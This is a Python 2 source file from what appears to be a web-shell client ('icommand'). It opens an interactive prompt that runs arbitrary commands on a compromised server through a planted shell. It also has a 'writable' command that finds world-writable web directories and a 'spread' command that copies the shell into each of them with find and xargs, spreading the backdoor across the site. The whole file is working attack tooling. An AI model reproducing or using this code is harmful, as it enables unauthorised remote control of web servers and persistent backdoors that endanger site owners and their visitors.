#from icommand.options import url
from request_info import url
from request_info import RequestType
from server_info import serverinfo
from menu import Colors, get_banner
from urllib import unquote
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to provide elaborate line editing and history features.'
else:
    pass


class Commander(RequestType):
    '''
    Subclassing Commander to inherit get_page_source method
    from the parent class RequestType
    '''
    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                try:
                    command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=serverinfo.source[0],
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=serverinfo.source[4],
                        cwd=serverinfo.source[3]))
                except IndexError:
                    command = raw_input('icommand@server:$ ')
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(command[1:], shell=True).wait()
                    elif command == 'info':
                        print serverinfo.info
                    elif command == 'banner':
                        print get_banner
                    elif command == 'writable':
                        self.cmd = "find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print"
                        self.writables = map(str.strip, self.get_page_source().readlines())
                        c = 1
                        for path in self.writables:
                            print '{0:2d}- {1}'.format(c, path)
                            c += 1
                    elif command == 'spread':
                        shell_name = url.split('/')[-1]
                        new_shell_name = raw_input('\n[!] Current shell name  {0}[default: {1}]{2}: '.format(Colors.RED, shell_name, Colors.END))
                        if shell_name == new_shell_name:
                            self.cmd = 'find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {}'.format(shell_name)
                            print self.get_page_source().read()
                            print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
                        else:
                            self.cmd = 'find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {}'.format(new_shell_name)
                            print self.get_page_source().read()
                            print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(new_shell_name)

                    else:
                        self.cmd = command
                        # to avoid issues realted to empty directories
                        if self.cmd == 'ls':
                            self.cmd = 'ls -lha'
                        source = self.get_page_source().read()
                        if source:
                            print source.rstrip()
                        else:
                            print '{}: command not found'.format(unquote(command))
                else:
                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                exit(1)
            i += 1

commander = Commander()
